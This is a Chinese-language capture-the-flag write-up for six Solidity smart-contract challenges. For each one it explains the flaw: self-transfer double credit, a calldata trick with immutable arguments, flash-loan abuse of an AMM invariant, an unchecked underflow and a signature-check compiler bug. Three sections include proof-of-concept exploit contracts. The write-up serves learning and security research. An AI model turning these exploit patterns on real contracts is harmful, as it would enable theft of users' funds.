### GreyHats Dollar

[題目](https://github.com/MiloTruck/evm-ctf-challenges/blob/main/src/greyhats-dollar): 
擔心通貨膨脹嗎？介紹 GreyHats Dollar (GHD)，全球首個內建通縮機制的貨幣！由 GREY 代幣支持，GHD 將以每年 3% 的速度自動通縮。

過關條件:
-  挑戰者需拿到 50000 以上 GHD

知識點:
- transferFrom 邏輯漏洞, double credit. 

解題:
- 挑戰者可以 cliam 1000 grey 代幣. 可以在 GHD合約 mint GHD 代幣, 關鍵漏洞在GHD合約的transferFrom函數轉賬時,只檢查了發送者餘額減少和接收者餘額增加,沒有檢查實際轉賬金額.

```
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public update returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares; //vulnerable
        uint256 toShares = shares[to] + _shares;  //vulnerable
```
[POC:](./gratcat/test/greyhats-dollar.sol) 
```
contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }
    function solve() external {
        // Step 1: Claim 1000 GREY tokens
        // The function begins by calling setup.claim() to claim 1000 GREY tokens.
        setup.claim();

        // Step 2: Approve GHD contract
        // It then grants approval for the GHD contract to spend the GREY tokens 
        // by calling approve on the GREY token contract, allowing the GHD contract 
        // to spend an unlimited amount (type(uint256).max).
        setup.grey().approve(address(setup.ghd()), type(uint256).max);

        // Step 3: Mint GHD tokens
        // After approval, the function mints GHD tokens by transferring the 1000 GREY tokens 
        // to the GHD contract using setup.ghd().mint(1000e18).
        setup.ghd().mint(1000e18);

        // Step 4: Looped transfers
        // The function performs a loop 50 times, transferring 1000 GHD tokens 
        // to the contract itself (address(this)) on each iteration.
        for (uint256 i = 0; i < 50; i++) {
            setup.ghd().transfer(address(this), 1000e18);
        }

        // Step 5: Transfer accumulated GHD to the caller
        // Once the loop completes, the function transfers all the accumulated GHD tokens 
        // from the contract to the caller (msg.sender) using 
        // setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this))).
        setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this)));
    }
}

```

### Escrow

[題目](https://github.com/MiloTruck/evm-ctf-challenges/blob/main/src/escrow): 
介紹基於 NFT 的代管系統——你可以存入資產並通過出售你的所有權 NFT 來交易代管！然而，我不小心放棄了自己代管的所有權。你能幫我找回資金嗎？

過關條件:
- escrow 合約上 grey 代幣餘額為0
- 挑戰者 grey 代幣餘額需 >= 10000

知識點:
-   ClonesWithImmutableArgs
-   Calldata 


解題:
- 當 ClonesWithImmutableArgs 代理被調用時，不可變參數和一個 2-byte 的長度字段會附加在委託調用（delegate call）的 calldata 中.
- tokenY 是 address(0)：address(0) 以 0x00 表示, tokenY 的最後一個 byte 為 0x00, 通過利用 ClonesWithImmutableArgs 的 calldata 優化, 我們可以省略 tokenY 的最後一個 byte, 並將未使用的 length field byte 作為 tokenY 的最後一個 byte, 你可以傳遞 19 bytes 的 0x00, 並且仍然能夠達到與傳遞完整 20 bytes 相同的效果, 計算出來的 paramsHash 會是一樣的, 這樣我們可以部署一樣的 escrowId 合約和覆蓋 owner.
[POC:](./gratcat/test/escrow.sol) 
```
function _getArgs() internal pure returns (address factory, address tokenX, address tokenY) {
    // This function retrieves three arguments: factory, tokenX, and tokenY.
    // factory is located at offset 0, tokenX at offset 20, and tokenY at offset 40.
    // tokenY is expected to be address(0), which allows us to optimize the calldata length.

    factory = _getArgAddress(0);
    tokenX = _getArgAddress(20);
    
    // Since tokenY is address(0) (0x00), we can utilize the first byte of the length field
    // to act as the last byte of tokenY. This reduces the calldata passed by 1 byte,
    // resulting in a different paramsHash.
    tokenY = _getArgAddress(40); // address(0) (0x00)
}

function _getArgAddress(uint256 argOffset)
    internal
    pure
    returns (address arg)
{
    // This function reads an address from calldata at the specified offset.
    uint256 offset = _getImmutableArgsOffset();
    
    // Use inline assembly to load 32 bytes from calldata, then shift right by 96 bits (12 bytes)
    // to get the correct 20-byte address.
    assembly {
        arg := shr(0x60, calldataload(add(offset, argOffset)))
    }
}

function _getImmutableArgsOffset() internal pure returns (uint256 offset) {
    // This function calculates the starting offset for the immutable arguments in calldata.
    // The last 2 bytes of calldata contain the length of the immutable arguments.
    
    // Subtract the last 2 bytes from the total calldata size to get the offset of the arguments.
    assembly {
        offset := sub(
            calldatasize(),
            shr(0xf0, calldataload(sub(calldatasize(), 2))) // Extract the last 2 bytes (length field)
        )
    }
}
```

### Simple AMM Vault

[題目](https://github.com/MiloTruck/evm-ctf-challenges/blob/main/src/simple-amm-vault): 
ERC-4626 太複雜了，所以我做了一個 AMM，能在股份與資產之間進行交換。

過關條件:
-  取得 3000 以上 grey token

知識點:
-   AMM 
-   閃電貸 


解題:
- AMM 合約內預設題目上有 1000 SA shares 和 2000 grey 代幣, 在swap 功能中要滿足 computeK(reserveX, reserveY) >= k, AMM提供了 flashloan, 不用手續費.
- Vault 合約預設有 2000 grey 代幣. 可以透過flashloan 借出 1000 SA, 可以把 vault 上的 2000 grey 領走, 在把 1000 grey 存入拿到 1000 SA, 在歸還給 flashloan.
- 因為目前仍滿足 computeK(reserveX, reserveY) >= k, 1000+1000>= 2000, 所以可以透過 swap 使用 0 SA share 換出 1000 grey 代幣,
  
[POC:](./gratcat/test/simple-amm-vault.sol) 

```
    function solve() external {
        vault = setup.vault();
        amm = setup.amm();
        grey = setup.grey();
        grey.approve(address(vault), type(uint256).max);
        // Claim 1000 GREY
        setup.claim();
 
        amm.flashLoan(true, 1000 ether, "");
        amm.swap(true, 0, 1000 ether);
        grey.transfer(msg.sender, grey.balanceOf(address(this)));
    }

    function onFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(amm));
        
        vault.withdraw(1000 ether);
        vault.deposit(1000 ether);
        vault.approve(address(amm), 1000 ether);

    }
```

### Voting Vault

[題目](https://github.com/MiloTruck/evm-ctf-challenges/blob/main/src/voting-vault): 
秉持去中心化精神，GreyHats 現在成為了一個 DAO！使用你的 GREY 代幣投票，決定我們的資金如何使用。

過關條件:
- 讓 flashLoan 功能失效

知識點:
-   Voting
    -   lock GREY 可獲取投票權
    -   propose 創建提案
    -   vote 提案投票
    -   execute 執行提案
    -   delegate 把投票權授權給其他人
-   Integer underflow


解題:
- 在 delegate 中把票投權授權給其他人的處理邏輯, 可以看到 _subtractVotingPower 會把 oldVotes - votes. 
- oldVotes 透過 oldVotes = history.getLatestVotingPower(delegatee); 取得就是lock的數量
- votes 透過_calculateVotes計算, 注意到有加乘 VOTE_MULTIPLIER 1.3e18. 會有進位問題. 以及delegate也會透過 _calculateVotes計算, 只要讓他前後push的時寫入history, 造成進位問題, 然後因為 uncheck oldVotes - votes 只要votes大於 oldVotes就可以 underflow.

```
function _subtractVotingPower(address delegatee, uint256 votes) internal {
    uint256 oldVotes = history.getLatestVotingPower(delegatee);
    unchecked { 
        history.push(delegatee, oldVotes - votes);  //unbderflow
    }
}

    function _calculateVotes(uint256 amount) internal pure returns (uint256) {
        return amount * VOTE_MULTIPLIER / 1e18;
    }
    function votingPower(address user, uint256 blockNumber) external view returns (uint256) {
        return history.getVotingPower(user, blockNumber);
    }
```

### Meta Staking

[題目](https://github.com/MiloTruck/evm-ctf-challenges/blob/main/src/meta-staking): 
 
過關條件:
- 從 Staking 合約中提取 10,000 GREY 代幣
- 最終合約的金庫 Vault 中的資金必須為 0

知識點:
-   Relayer 中繼機制: 它可以通過 execute 和 executeBatch 函數，使用簽名來進行代幣轉移 
 


解題:
- 題目在部署 Staking 的時候, RelayReceiver 設定為 relayer 中繼合約. 並且 staking 10000 GREY, 拿到 10000 STK.
- 通過一個中繼機制（Relayer）進行攻擊，從 Setup 合約的金庫中提取 10000 STK
- Withdraw 10000 STK 拿到  10000 GREY.


### Gnosis Unsafe

[題目](https://github.com/MiloTruck/evm-ctf-challenges/blob/main/src/gnosis-unsafe): 以下合約中，能在沒有擁有者權限的情況下執行交易嗎？
 
過關條件:
- 把 safe 合約內的 10000 GREY 取出

知識點:
- 簡化版的多簽合約

解題:
- queueTransaction 需等VETO_DURATION 1分鐘後才能執行 executeTransaction 需繞過以下檢查

```
        address signer = ecrecover(
            txHash, 
            v[signatureIndex], 
            r[signatureIndex], 
            s[signatureIndex]
        );
        if (signer != transaction.signer) 
```
- 看群裡討論是 solidity 0.8.15 的 [bug](https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/) 
